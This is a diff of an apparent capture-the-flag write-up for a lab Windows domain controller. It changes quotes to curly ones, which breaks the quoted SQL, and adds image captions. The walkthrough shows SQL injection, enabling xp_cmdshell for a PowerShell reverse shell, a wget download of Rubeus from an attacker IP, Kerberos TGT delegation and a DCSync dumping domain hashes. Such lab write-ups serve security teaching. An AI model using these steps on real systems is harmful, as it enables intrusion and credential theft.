@@ -757,59 +763,59 @@ Discovered open port 593/tcp on 10.129.254.249
 Discovered open port 464/tcp on 10.129.254.249
 ```
 
-For the sake of the writeup, i'll jump straight to the webserver on port 80.
+For the sake of the writeup, i’ll jump straight to the webserver on port 80.
 
 Where we have a way to execute some commands ping,traceroute,nslookup.
 
-![Lookout Utility WebPage](/static/images/stack-the-flags-2022/Lookout-Utility-WebPage.png)
+![A screenshot of the Lookout Utility WebPage](/static/images/stack-the-flags-2022/Lookout-Utility-WebPage.png)
 
 This page is not vulnerable to anything.
 
-So i'll just ping my box for now
+So i’ll just ping my box for now
 
-![Scan Results](/static/images/stack-the-flags-2022/Scan-Results.png)
+![A screenshot of the Scan Results that we runned through the utility](/static/images/stack-the-flags-2022/Scan-Results.png)
 
 We can check in the `Past Scans` that our scan was created!
 
-![Past Results](/static/images/stack-the-flags-2022/Past-Results.png)
+![A screenshot that shows all the Past Results](/static/images/stack-the-flags-2022/Past-Results.png)
 
 We can notice that we delete the scan with the X under action.
 
-I'll intercept that request using burp to play a bit with it
-![request delete scan](/static/images/stack-the-flags-2022/request-delete-scan.png)
+I’ll intercept that request using burp to play a bit with it
+![A screenshot that shows the request delete scan](/static/images/stack-the-flags-2022/request-delete-scan.png)
 
 After few tries, I noticed it was vulnerable to an SQLi
 
-![testing sqli sleep](/static/images/stack-the-flags-2022/testing-sqli-sleep.png)
+![A screenshot where we test testing sqli sleep and that shows the 5 seconds delay](/static/images/stack-the-flags-2022/testing-sqli-sleep.png)
 
 ### Exploitation
 
-The first thing i've tried was to enable `xp_cmdshell` and use it get code execution
+The first thing i’ve tried was to enable `xp_cmdshell` and use it get code execution
 
 ```
-EXEC sp_configure 'show advanced options', 1
+EXEC sp_configure ’show advanced options’, 1
 RECONFIGURE-- -
-EXEC sp_configure 'xp_cmdshell', '1'
+EXEC sp_configure ’xp_cmdshell’, ’1’
 RECONFIGURE
 ```
 
-![configure1](/static/images/stack-the-flags-2022/configure1.png)
+![A screenshot of xp_cmdshell configuration](/static/images/stack-the-flags-2022/configure1.png)
 
-![configure2](/static/images/stack-the-flags-2022/configure2.png)
+![A screenshot of xp_cmdshell configuration](/static/images/stack-the-flags-2022/configure2.png)
 
-![configure3](/static/images/stack-the-flags-2022/configure3.png)
+![A screenshot of xp_cmdshell configuration](/static/images/stack-the-flags-2022/configure3.png)
 
-Then we can use `EXEC xp_cmdshell '<COMMAND>'`
+Then we can use `EXEC xp_cmdshell ’<COMMAND>’`
 
-![rce-sqli](/static/images/stack-the-flags-2022/rce-sqli.png)
+![A screenshot of executing xp_cmdshell to get a reverse shell through powershell](/static/images/stack-the-flags-2022/rce-sqli.png)
 
 And we get a shell as the nt service
 
-![shell-as-service-nt](/static/images/stack-the-flags-2022/shell-as-service-nt.png)
+![A screenshot of getting a shell as nt service](/static/images/stack-the-flags-2022/shell-as-service-nt.png)
 
 > Nothing that we can directly get a shell with sqlmap
 
-![sqlmap-result](/static/images/stack-the-flags-2022/sqlmap-result.png)
+![A screenshot that shows the sqlmap results](/static/images/stack-the-flags-2022/sqlmap-result.png)
 
 ### Privilege Escalation
 
@@ -821,13 +827,13 @@ The Service accounts are vulnerable to TGT delegation attacks using Rubeus becau
 
 The idea is to get valid TGT (Ticket-Granting Ticket) for the service account, to perform a DCSync attack and then PSExec into the machine as administrador.
 
-First i'll upload Rubeus to the remove machine
+First i’ll upload Rubeus to the remove machine
 
 ```
 PS C:\Windows\System32\spool\drivers\color> wget 10.10.14.57/Rubeus.exe -o r.exe
 ```
 
-Then i'll use it to generate a TGT for the service account
+Then i’ll use it to generate a TGT for the service account
 
 ```
 PS C:\Windows\System32\spool\drivers\color> .\r.exe tgtdeleg /nowrap
@@ -845,8 +851,8 @@ PS C:\Windows\System32\spool\drivers\color> .\r.exe tgtdeleg /nowrap
 
 [*] Action: Request Fake Delegation TGT (current user)
 
-[*] No target SPN specified, attempting to build 'cifs/dc.domain.com'
-[*] Initializing Kerberos GSS-API w/ fake delegation for target 'cifs/LOOKOUT-DC.LOOKOUT.local'
+[*] No target SPN specified, attempting to build ’cifs/dc.domain.com’
+[*] Initializing Kerberos GSS-API w/ fake delegation for target ’cifs/LOOKOUT-DC.LOOKOUT.local’
 [+] Kerberos GSS-API initialization success!
 [+] Delegation requset success! AP-REQ delegation ticket is now in GSS-API output.
 [*] Found the AP-REQ delegation ticket in the GSS-API output.
@@ -858,7 +864,7 @@ PS C:\Windows\System32\spool\drivers\color> .\r.exe tgtdeleg /nowrap
       doIF3jCCBdqgA<SNIIIIIIIIIP>AWoAMCAQGFM
 ```
 
-I'll save to my local machine and convert the ticket with `TicketConverter` from `impacket`
+I’ll save to my local machine and convert the ticket with `TicketConverter` from `impacket`
 
 ```
 hcue@pjsk:/tmp/wr » cat ticket| base64 -d > ticket.kirbi
@@ -869,19 +875,19 @@ Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 [+] done
 ```
 
-Then i'll export it to my env variables
+Then i’ll export it to my env variables
 
 ```
 hcue@pjsk:/tmp/wr » export KRB5CCNAME=/tmp/wr/ticket.ccache
 ```
 
-One last thing, we need to synchronize our local time to the server, otherwise it won't work
+One last thing, we need to synchronize our local time to the server, otherwise it won’t work
 
 ```
 sudo ntpdate 10.129.254.249
 ```
 
-Now to perform a DCSync on the target, we can use impacket's `secretsdump.py` script to extract all the hashes from the domain controller. We need to specify kerberos authentication and no password for this operation.
+Now to perform a DCSync on the target, we can use impacket’s `secretsdump.py` script to extract all the hashes from the domain controller. We need to specify kerberos authentication and no password for this operation.
 
 ```
 hcue@pjsk:/tmp/wr » impacket-secretsdump LOOKOUT-DC.LOOKOUT.local -dc-ip 10.129.254.249 -no-pass -k
@@ -975,7 +981,7 @@ df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
 [+] Process created, enjoy!
 ```
 
-And i grab my shell
+And I grab my shell
 
 ```
 hcue@pjsk:/opt/xc(master○) » ./xc -l -p 443                                                                                                                                                                                            1 ↵
